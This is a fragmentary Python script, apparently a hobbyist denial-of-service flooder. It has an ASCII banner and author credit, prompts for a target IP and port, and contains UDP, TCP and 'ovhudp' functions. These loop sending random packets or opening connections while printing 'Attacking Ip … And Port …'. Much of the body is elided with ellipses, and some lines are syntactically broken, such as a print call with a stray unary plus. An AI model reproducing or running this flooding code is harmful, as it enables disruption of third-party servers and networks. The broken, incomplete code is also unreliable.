...
║╔═╗║║║╚╗─║║─║╚═╝║
╚╝─╚╩╝╚═╝─╚╝─╚═══╝      ''')
print ('''            ====    Author : BanuXyz X Aryo Ganteng    ====                        ''')
os.system("cls")
ip = str(input(" IP :"))
port = int(input(" Port :"))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m  Aryo Ni Dek Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[91m Aryo Ni Dek Attacking Ip %s And Port %s"%(ip,port))
def ovhudp():
	data = random._urandom(811)
	while True:
		try:
